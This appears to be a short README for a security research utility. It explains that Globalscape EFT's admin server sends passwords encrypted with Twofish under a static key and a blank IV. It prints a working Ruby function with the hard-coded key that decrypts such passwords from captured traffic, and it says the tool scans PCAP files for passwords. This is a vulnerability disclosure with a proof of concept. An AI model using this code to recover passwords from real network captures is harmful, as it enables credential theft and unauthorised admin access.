By default, when authenticating to Globalscape EFT's admin server, the password
is sent in effectively cleartext - it's encrypted with Twofish, using a blank
IV and a static key. That means it can be decrypted off the wire:

```ruby
  def self.decrypt_password(b)
    # Static 5-byte key for extra security
    tf = Twofish.new("tfgry\0\0\0\0\0\0\0\0\0\0\0", :padding => :zero_byte, :mode => :cbc)

    # By default, the library randomizes the IV, so set it specifically
    tf.iv = "\0" * 16

    # We need to append a NUL byte, because this is UTF-16 and zero-padded, which
    # means the final character is truncated (lol)
    return (tf.decrypt(b) + "\0").force_encoding("UTF-16LE").encode("ASCII-8BIT")
  end
```

This utility reads a PCAP file and searches for passwords.
